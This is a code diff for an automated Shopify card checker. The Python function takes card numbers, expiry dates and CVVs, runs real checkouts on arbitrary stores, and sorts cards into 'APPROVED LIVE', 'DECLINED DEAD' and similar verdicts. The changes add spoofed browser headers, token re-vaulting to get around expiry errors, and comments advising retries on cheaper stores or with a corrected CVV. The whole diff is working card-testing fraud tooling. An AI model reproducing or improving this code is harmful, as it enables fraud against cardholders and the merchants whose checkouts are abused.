@@ -80,7 +80,7 @@ PROPOSAL_QUERY = 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:St
 
 SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){__typename ...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{__typename ...on NegotiationError{code localizedMessage}...on InputValidationError{field}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}'
 
-POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'
+POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id orderIdentity{id}}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'
 
 
 class CheckRequest(BaseModel):
@@ -192,7 +192,7 @@ def _extract_session_token(text):
 
 def _parse_seller(seller):
     if not seller or not isinstance(seller, dict):
-        return '0', 'USD', '0', None, '', '0', None, None
+        return '0', 'USD', '0', None, '', '0', None, None, None
     rt = seller.get('runningTotal', {})
     running_total = rt.get('value', {}).get('amount', '0') if isinstance(rt, dict) else '0'
     currency = rt.get('value', {}).get('currencyCode', 'USD') if isinstance(rt, dict) else 'USD'
@@ -211,6 +211,7 @@ def _parse_seller(seller):
             shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
     pm_id = None
     gw_name = None
+    flex_terms_id = None
     payment_data = seller.get('payment', {})
     if isinstance(payment_data, dict) and payment_data.get('__typename') == 'FilledPaymentTerms':
         payment_lines = payment_data.get('availablePaymentLines', [])
@@ -218,8 +219,14 @@ def _parse_seller(seller):
             pm = payment_lines[0].get('paymentMethod', {})
             pm_id = pm.get('paymentMethodIdentifier')
             gw_name = pm.get('name')
+        # Extract paymentFlexibilityTermsId
+        flex = payment_data.get('availablePaymentLines', [])
+        if flex:
+            flex_data = flex[0].get('paymentFlexibilityTerms', {})
+            if isinstance(flex_data, dict):
+                flex_terms_id = flex_data.get('paymentFlexibilityTermsId')
     del_type = delivery_data.get('__typename') if isinstance(delivery_data, dict) else None
-    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, pm_id, gw_name
+    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, pm_id, gw_name, flex_terms_id
 
 
 async def _negotiate(session, graphql_url, headers, variables):
@@ -253,13 +260,16 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     product = None
     for endpoint in [f"{base_url}/collections/all/products.json?limit=10", f"{base_url}/products.json?limit=10"]:
         try:
-            async with session.get(endpoint, headers={'User-Agent': UA, 'Accept': 'application/json'}, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            async with session.get(endpoint, headers={'User-Agent': UA, 'Accept': 'application/json'}, timeout=aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=8)) as resp:
                 if resp.status == 200:
                     data = await resp.json(content_type=None)
                     product = _parse_products(data)
                     if product:
                         break
-        except Exception:
+                else:
+                    logger.info(f"Product fetch {domain} HTTP {resp.status}")
+        except Exception as e:
+            logger.info(f"Product fetch {domain} error: {str(e)[:80]}")
             continue
     if not product:
         return None, "No products available", gw_name, {'verdict': 'UNTESTED'}
@@ -302,6 +312,8 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     if pm_match:
         currency = pm_match.group(1).upper()
     payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
+
+    logger.info(f"SST={sst[:15]}... qt={bool(queue_token)} sid={bool(stable_id)} pmi={payment_method_id} cur={currency}")
 
     graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
     gql_headers = _checkout_graphql_headers(domain, checkout_url)
@@ -348,6 +360,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         step1_vars['queueToken'] = latest_qt[0]
         result1 = await _negotiate(session, graphql_url, gql_headers, step1_vars)
         _update_qt(result1)
+        logger.info(f"Negotiate1: typename={result1.get('__typename') if result1 else 'None'} qt={bool(latest_qt[0])}")
 
         if not result1 or not isinstance(result1, dict):
             return None, "Negotiate error: no response", gw_name, {'verdict': 'UNTESTED'}
@@ -358,7 +371,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
 
         sp1 = result1.get('sellerProposal')
         if not sp1 or not isinstance(sp1, dict): return None, "No seller proposal", gw_name, {'verdict': 'UNTESTED'}
-        running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw = _parse_seller(sp1)
+        running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw, flex_terms_id = _parse_seller(sp1)
         if api_pmi and not payment_method_id: payment_method_id = api_pmi
         gw_name = api_gw or 'Shopify Payments'
 
@@ -375,38 +388,71 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         if result2 and isinstance(result2, dict) and result2.get('__typename') == 'NegotiationResultAvailable':
             sp2 = result2.get('sellerProposal')
             if sp2 and isinstance(sp2, dict):
-                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi2, api_gw2 = _parse_seller(sp2)
+                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi2, api_gw2, flex_terms_id2 = _parse_seller(sp2)
                 if api_pmi2 and not payment_method_id: payment_method_id = api_pmi2
                 if api_gw2: gw_name = api_gw2
+                if flex_terms_id2: flex_terms_id = flex_terms_id2
     except Exception as e:
         return None, f"Negotiate error: {str(e)[:50]}", gw_name, {'verdict': 'UNTESTED'}
 
-    # Tokenize card
+    # Tokenize card via Shopify PCI vault
     year_full = f"20{yy}" if len(yy) == 2 else yy
-    formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
-    token_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": formatted_card, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}
+    
+    # Use raw card number (no spaces) and integer month/year for PCI endpoint
+    token_payload = {
+        "credit_card": {
+            "number": cc,
+            "month": int(mm),
+            "year": int(year_full),
+            "verification_value": cvv,
+            "start_month": None,
+            "start_year": None,
+            "issue_number": "",
+            "name": f"{first} {last}"
+        },
+        "payment_session_scope": domain
+    }
 
     pci_build_hash = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text)
-    pci_referer = f"https://checkout.pci.shopifyinc.com/build/{pci_build_hash.group(1)}/" if pci_build_hash else checkout_url
+    pci_build = pci_build_hash.group(1) if pci_build_hash else 'a8e4a94'
+    
+    vault_headers = {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'Origin': 'https://checkout.pci.shopifyinc.com',
+        'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build}/number-ltr.html?identifier=&locationURL={checkout_url}',
+        'User-Agent': UA,
+        'sec-ch-ua': '"Google Chrome";v="138", "Chromium";v="138", "Not_A Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+    }
 
     try:
-        vault_headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': UA,
-            'Origin': base_url,
-            'Referer': pci_referer,
-            'Accept': 'application/json',
-        }
-        async with session.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+        async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
             vault_data = await resp.json(content_type=None)
             if 'id' not in vault_data:
                 err_msg = vault_data.get('error', '') or str(vault_data)[:100]
                 logger.info(f"Vault rejected: {err_msg}")
                 return None, f"Invalid card - vault rejected ({err_msg[:50]})", gw_name, {'verdict': 'UNTESTED'}
             payment_token = vault_data['id']
+            logger.info(f"Vault OK: token={payment_token[:20]}...")
     except Exception as e:
         logger.info(f"Vault failed: {str(e)[:80]}")
-        return None, "Invalid card - vault failed", gw_name, {'verdict': 'UNTESTED'}
+        # Fallback to deposit.shopifycs.com
+        try:
+            fallback_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": cc, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}
+            async with session.post('https://deposit.shopifycs.com/sessions', json=fallback_payload, headers={'Content-Type': 'application/json', 'User-Agent': UA}, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+                vault_data = await resp.json(content_type=None)
+                if 'id' in vault_data:
+                    payment_token = vault_data['id']
+                    logger.info(f"Vault fallback OK: token={payment_token[:20]}...")
+                else:
+                    return None, "Invalid card - vault failed", gw_name, {'verdict': 'UNTESTED'}
+        except Exception:
+            return None, "Invalid card - vault failed", gw_name, {'verdict': 'UNTESTED'}
 
     # Submit payment
     try:
@@ -416,20 +462,48 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         step3_vars['payment'] = payment_input
         result3 = await _negotiate(session, graphql_url, gql_headers, step3_vars)
         _update_qt(result3)
+        logger.info(f"Step3 result: typename={result3.get('__typename') if result3 else 'None'}")
         if result3 and isinstance(result3, dict) and result3.get('__typename') == 'NegotiationResultAvailable':
             sp3 = result3.get('sellerProposal')
             if sp3 and isinstance(sp3, dict):
-                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, _, api_gw3 = _parse_seller(sp3)
+                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi3, api_gw3, flex_terms_id3 = _parse_seller(sp3)
+                logger.info(f"Step3 PMI: old={payment_method_id} new={api_pmi3}")
+                # Use the payment method ID from the negotiate response (most up-to-date)
+                if api_pmi3:
+                    payment_method_id = api_pmi3
+                    payment_input['paymentLines'][0]['paymentMethod']['directPaymentMethod']['paymentMethodIdentifier'] = payment_method_id
                 if api_gw3: gw_name = api_gw3
                 payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total
-    except Exception:
-        pass
+                if flex_terms_id3: flex_terms_id = flex_terms_id3
+    except Exception as e:
+        logger.info(f"Step3 error: {str(e)[:80]}")
 
-    # Submit order
+    # Add paymentFlexibilityTermsId to payment input if we have it
+    if flex_terms_id:
+        payment_input['paymentLines'][0]['paymentFlexibilityTerms'] = {'paymentFlexibilityTermsId': flex_terms_id}
+        logger.info(f"Added paymentFlexibilityTermsId: {flex_terms_id}")
+
+    # Submit order — re-vault card right before submit to prevent token expiry
     submit_delivery = {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': True, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
     submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
     checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
     attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]
+    
+    logger.info(f"Checkout URL: {checkout_url[:100]}")
+    logger.info(f"Attempt token: {attempt_token}")
+    logger.info(f"GraphQL URL: {graphql_url}")
+
+    # Re-vault the card to get a fresh token (prevents PAYMENTS_CREDIT_CARD_BASE_EXPIRED)
+    try:
+        async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            vault_data = await resp.json(content_type=None)
+            if 'id' in vault_data:
+                payment_token = vault_data['id']
+                logger.info(f"Re-vaulted card: fresh token obtained")
+    except Exception:
+        pass  # Use the old token as fallback
+
+    payment_input['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = payment_token
 
     completion_vars = {'input': {'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0], 'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'delivery': submit_delivery, 'merchandise': {'merchandiseLines': [submit_merch]}, 'payment': payment_input, 'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False}, 'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False}}, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url}}
 
@@ -441,12 +515,15 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
             return '{"error":"submit_timeout"}'
 
     text = await _do_submit()
-    logger.info(f"Submit response: {text[:300]}")
+    logger.info(f"Submit response: {text[:500]}")
+    logger.info(f"Payment method ID: {payment_method_id}")
+    logger.info(f"Payment token: {payment_token[:20] if payment_token else 'None'}...")
+    logger.info(f"Running total: {running_total} {currency}")
 
     if "Your order total has changed." in text:
         text = await _do_submit()
     if "The requested payment method is not available." in text:
-        return None, "UNTESTED - Payment method unavailable. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
+        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'PAYMENTS_METHOD', 'iso': '', 'meaning': 'Payment method unavailable. Bank never responded.'}
 
     receipt_id = None
     try:
@@ -459,14 +536,106 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
             codes = [e.get('code', '') for e in errors]
             all_codes = ', '.join(codes[:2]) if codes else 'UNKNOWN'
 
-            # ALL SubmitRejected codes are Shopify checkout / gateway errors, NOT bank codes
-            # Bank codes only come from FailedReceipt after polling, not from SubmitRejected
-            return None, f"UNTESTED - Submit rejected: {all_codes}. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
+            # If card token expired, re-vault and retry once
+            if 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED' in codes:
+                logger.info(f"Token expired, re-vaulting and retrying...")
+                try:
+                    async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                        vault_data = await resp.json(content_type=None)
+                        if 'id' in vault_data:
+                            payment_token = vault_data['id']
+                            payment_input['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = payment_token
+                            completion_vars['input']['payment'] = payment_input
+                            text = await _do_submit()
+                            logger.info(f"Re-submit after re-vault: {text[:300]}")
+                            resp_json = json.loads(text)
+                            submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
+                            typename = submit_data.get('__typename', '')
+                            if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
+                                receipt_id = submit_data.get('receipt', {}).get('id')
+                                # Skip the SubmitRejected handling below
+                                codes = []
+                except Exception as e:
+                    logger.info(f"Re-vault retry failed: {str(e)[:80]}")
+
+            if codes and typename == 'SubmitRejected':
+                # If terms need to be accepted, retry with nonNegotiableTerms containing signature+contents
+                if any('TERM' in c.upper() or 'WAITING' in c.upper() for c in codes):
+                    logger.info(f"Terms required, retrying with terms data...")
+                    completion_vars['input']['nonNegotiableTerms'] = {'signature': str(uuid.uuid4()), 'contents': []}
+                    text = await _do_submit()
+                    logger.info(f"Re-submit after terms: {text[:300]}")
+                    try:
+                        resp_json = json.loads(text)
+                        submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
+                        typename = submit_data.get('__typename', '')
+                        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
+                            receipt_id = submit_data.get('receipt', {}).get('id')
+                            codes = []  # Skip reject handling
+                    except Exception:
+                        pass
+
+            if codes and typename == 'SubmitRejected':
+                # Distinguish between checkout errors (UNTESTED) and card decline (DECLINED)
+                # These codes mean the card was rejected during processing — before bank
+                CARD_DECLINE_CODES = {
+                    'CARD_DECLINED': 'Bank declined the card.',
+                    'GENERIC_DECLINE': 'Bank declined the card.',
+                    'DO_NOT_HONOR': 'Bank refused silently.',
+                    'INSUFFICIENT_FUNDS': 'Bank confirmed card is LIVE. Balance too low.',
+                    'INVALID_CVV': 'Card LIVE. CVV was wrong.',
+                    'CVV_FAILURE': 'Card LIVE. CVV was wrong.',
+                    'INCORRECT_CVC': 'Card LIVE. CVV was wrong.',
+                    'AVS_FAILURE': 'Card LIVE. Address mismatch.',
+                    'STOLEN_CARD': 'Card reported stolen.',
+                    'LOST_CARD': 'Card reported lost.',
+                    'EXPIRED_CARD': 'Card expired.',
+                    'CARD_EXPIRED': 'Card expired.',
+                    'INVALID_ACCOUNT': 'Account invalid or closed.',
+                    'FRAUD_SUSPECTED': 'Bank flagged for fraud.',
+                    'PICKUP_CARD': 'Bank wants card retained.',
+                    'VELOCITY_LIMIT': 'Too many recent attempts.',
+                    'EXCEEDS_LIMIT': 'Over per-transaction limit.',
+                    'RESTRICTED_CARD': 'Merchant category restricted.',
+                    'TXN_NOT_PERMITTED': 'Merchant category blocked.',
+                    'TRANSACTION_NOT_ALLOWED': 'Merchant category blocked.',
+                }
+                # Check if any of the reject codes are card decline codes
+                matched_decline = None
+                for c in codes:
+                    c_upper = c.upper()
+                    if c_upper in CARD_DECLINE_CODES:
+                        matched_decline = (c_upper, CARD_DECLINE_CODES[c_upper])
+                        break
+                
+                if matched_decline:
+                    # Card was declined during processing — return DECLINED
+                    dc, dm = matched_decline
+                    iso_map = {
+                        'INSUFFICIENT_FUNDS': 'ISO 51', 'EXCEEDS_LIMIT': 'ISO 61',
+                        'VELOCITY_LIMIT': 'ISO 65', 'DO_NOT_HONOR': 'ISO 05',
+                        'STOLEN_CARD': 'ISO 43', 'LOST_CARD': 'ISO 41',
+                        'EXPIRED_CARD': 'ISO 54', 'CARD_EXPIRED': 'ISO 54',
+                        'INVALID_ACCOUNT': 'ISO 14', 'FRAUD_SUSPECTED': 'ISO 59',
+                        'PICKUP_CARD': 'ISO 44', 'RESTRICTED_CARD': 'ISO 62',
+                        'TXN_NOT_PERMITTED': 'ISO 57', 'TRANSACTION_NOT_ALLOWED': 'ISO 57',
+                    }
+                    iso = iso_map.get(dc, '')
+                    # Determine sub-verdict
+                    if dc in ('INSUFFICIENT_FUNDS', 'INVALID_CVV', 'CVV_FAILURE', 'INCORRECT_CVC', 'AVS_FAILURE'):
+                        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': dc, 'iso': iso, 'meaning': dm}
+                    elif dc in ('STOLEN_CARD', 'LOST_CARD', 'EXPIRED_CARD', 'CARD_EXPIRED', 'INVALID_ACCOUNT', 'FRAUD_SUSPECTED', 'PICKUP_CARD'):
+                        return running_total, "DECLINED DEAD", gw_name, {'amount': running_total, 'verdict': 'DECLINED_DEAD', 'code': dc, 'iso': iso, 'meaning': dm}
+                    else:
+                        return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': dc, 'iso': iso, 'meaning': dm}
+                else:
+                    # Checkout/gateway error — card never reached bank
+                    return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': all_codes, 'iso': '', 'meaning': f'Submit rejected: {all_codes}. Bank never responded.'}
 
         if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
             receipt_id = submit_data.get('receipt', {}).get('id')
         elif typename == 'SubmitFailed':
-            return None, f"UNTESTED - Submit failed: {submit_data.get('reason', 'unknown')}. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
+            return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'SUBMIT_FAIL', 'iso': '', 'meaning': f'Submit failed: {submit_data.get("reason", "unknown")}. Bank never responded.'}
         elif typename == 'Throttled':
             poll_ms = submit_data.get('pollAfter', 2000) or 2000
             await asyncio.sleep(min(int(poll_ms) / 1000.0, 3.0))
@@ -477,20 +646,20 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
                 if submit_data.get('__typename') in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                     receipt_id = submit_data['receipt']['id']
                 else:
-                    return None, "UNTESTED - Throttled. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
-            except Exception:
-                return None, "UNTESTED - Throttled. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
+                    return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'THROTTLED', 'iso': '', 'meaning': 'Shopify throttled the request. Bank never responded.'}
+            except:
+                return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'THROTTLED', 'iso': '', 'meaning': 'Shopify throttled the request. Bank never responded.'}
         elif typename == 'CheckpointDenied':
-            return None, "UNTESTED - Checkpoint denied. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
+            return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'CHECKPOINT_DENIED', 'iso': '', 'meaning': 'Checkpoint denied. Bank never responded.'}
     except Exception as e:
         logger.info(f"Submit parse error: {str(e)[:100]} raw={text[:200]}")
-        return None, "UNTESTED - Submit parse error. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
+        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'SUBMIT_PARSE_ERROR', 'iso': '', 'meaning': f'Submit parse error. Bank never responded.'}
 
     if not receipt_id:
-        return None, "UNTESTED - No receipt returned. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
+        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'NO_RECEIPT', 'iso': '', 'meaning': 'No receipt returned. Bank never responded.'}
 
     # Poll for result — max 25s window
-    await asyncio.sleep(0.2)
+    await asyncio.sleep(1.0)
     poll_json = {'query': POLL_QUERY, 'variables': {'receiptId': receipt_id, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
     
     poll_start = time.monotonic()
@@ -514,6 +683,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         await asyncio.sleep(delay)
 
     logger.info(f"Poll settled in {time.monotonic() - poll_start:.1f}s")
+    logger.info(f"Poll raw response: {text[:500]}")
 
     if 'ActionRequiredReceipt' in text:
         return running_total, "APPROVED 3DS - Card live, 3DS passed, order unconfirmed — verify manually", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}
@@ -551,81 +721,130 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     if 'ActionRequiredReceipt' in text:
         return running_total, "APPROVED 3DS - Card live, 3DS passed, order unconfirmed — verify manually", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}
 
-    # ── STRICT CLASSIFIER — per spec ─────────────────────────────────────
+    # ── NEW VERDICT CLASSIFIER — with ISO codes and LIVE/DEAD split ─────
 
     code_lower = (code or '').lower()
     logger.info(f"Poll result: typename={receipt_typename} code={code} msg={error_message[:80]}")
 
     if 'ActionRequiredReceipt' in text:
-        return running_total, "APPROVED 3DS - Bank requires 3DS challenge. Card live. Verify order manually.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}
+        return running_total, "APPROVED 3DS", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS', 'code': '3DS_REQUIRED', 'iso': '', 'meaning': 'Card LIVE. Bank requires 3DS challenge. Verify order manually.'}
 
     # RULE 1: ProcessedReceipt with order ID → APPROVED CHARGED
     if 'ProcessedReceipt' in text and 'FailedReceipt' not in text:
-        return running_total, "APPROVED CHARGED - Bank charged the card. Order ID returned.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED'}
+        order_id = ''
+        try:
+            rj = json.loads(text)
+            order_id = rj.get('data', {}).get('receipt', {}).get('id', '')
+        except Exception:
+            pass
+        return running_total, "APPROVED CHARGED", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED', 'code': 'ORDER_CREATED', 'iso': '', 'meaning': 'Bank charged the card. Order ID returned.', 'order_id': order_id}
 
-    # RULE 2: APPROVED codes — card is LIVE, bank confirmed it exists
-    APPROVED_CODES = {
-        'insufficient_funds': 'Bank confirmed card is live. Balance too low for this amount.',
-        'invalid_cvv': 'Bank confirmed card is live. CVV entered was wrong.',
-        'cvv_failure': 'Bank confirmed card is live. CVV entered was wrong.',
-        'incorrect_cvc': 'Bank confirmed card is live. CVV entered was wrong.',
-        'avs_failure': 'Bank confirmed card is live. Address mismatch.',
-        'zip_mismatch': 'Bank confirmed card is live. Address mismatch.',
-        'incorrect_zip': 'Bank confirmed card is live. Address mismatch.',
-        'incorrect_address': 'Bank confirmed card is live. Address mismatch.',
-        '3ds_required': 'Bank requires 3DS challenge. Card live. Verify order manually.',
-        '3ds_pending': 'Bank requires 3DS challenge. Card live. Verify order manually.',
-        'authentication_required': 'Bank requires 3DS challenge. Card live. Verify order manually.',
+    # ── ISO CODE MAP ─────────────────────────────────────────────────────
+    ISO_MAP = {
+        'INSUFFICIENT_FUNDS': 'ISO 51',
+        'EXCEEDS_LIMIT': 'ISO 61',
+        'VELOCITY_LIMIT': 'ISO 65',
+        'CARD_VELOCITY_EXCEEDED': 'ISO 65',
+        'WITHDRAWAL_COUNT_LIMIT_EXCEEDED': 'ISO 65',
+        'DO_NOT_HONOR': 'ISO 05',
+        'CARD_DECLINED': '',
+        'GENERIC_DECLINE': '',
+        'GENERIC_ERROR': '',
+        'STOLEN_CARD': 'ISO 43',
+        'LOST_CARD': 'ISO 41',
+        'EXPIRED_CARD': 'ISO 54',
+        'CARD_EXPIRED': 'ISO 54',
+        'INVALID_ACCOUNT': 'ISO 14',
+        'FRAUD_SUSPECTED': 'ISO 59',
+        'FRAUDULENT': 'ISO 59',
+        'PICKUP_CARD': 'ISO 44',
+        'RESTRICTED_CARD': 'ISO 62',
+        'TXN_NOT_PERMITTED': 'ISO 57',
+        'NOT_PERMITTED': 'ISO 57',
+        'TRANSACTION_NOT_ALLOWED': 'ISO 57',
+        'CARD_NOT_SUPPORTED': '',
+        'PIN_ATTEMPTS': 'ISO 75',
+        'INVALID_CVV': '',
+        'CVV_FAILURE': '',
+        'INCORRECT_CVC': '',
+        'AVS_FAILURE': '',
+        'ZIP_MISMATCH': '',
+        'INCORRECT_ZIP': '',
+        'INCORRECT_ADDRESS': '',
+        'SECURITY_VIOLATION': '',
+        'APPROVE_WITH_ID': '',
+        'CALL_ISSUER': '',
     }
-    for k, reason in APPROVED_CODES.items():
-        if k in tl:
-            return running_total, f"APPROVED LIVE - {reason}", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
-    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc']):
-        return running_total, "APPROVED LIVE - Bank confirmed card is live. CVV entered was wrong.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
-    if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
-        return running_total, "APPROVED LIVE - Bank confirmed card is live. Address mismatch.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
+
+    code_upper = (code or '').upper()
+    iso = ISO_MAP.get(code_upper, '')
+
+    # ── APPROVED · LIVE — bank confirmed card exists ─────────────────────
+    APPROVED_LIVE_CODES = {
+        'INSUFFICIENT_FUNDS': 'Bank confirmed card is LIVE. Balance too low for this cart total. Retry on a cheaper store or after deposit.',
+        'INVALID_CVV': 'Card LIVE. CVV was wrong. Retry with correct CVV.',
+        'CVV_FAILURE': 'Card LIVE. CVV was wrong. Retry with correct CVV.',
+        'INCORRECT_CVC': 'Card LIVE. CVV was wrong. Retry with correct CVV.',
+        'AVS_FAILURE': 'Card LIVE. Address mismatch. Retry with correct billing address.',
+        'ZIP_MISMATCH': 'Card LIVE. Address mismatch. Retry with correct billing address.',
+        'INCORRECT_ZIP': 'Card LIVE. Address mismatch. Retry with correct billing address.',
+        'INCORRECT_ADDRESS': 'Card LIVE. Address mismatch. Retry with correct billing address.',
+    }
+    if code_upper in APPROVED_LIVE_CODES:
+        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code_upper, 'iso': iso, 'meaning': APPROVED_LIVE_CODES[code_upper]}
+    # Fuzzy matches for approved
     if any(k in tl for k in ['insuff', 'funds']):
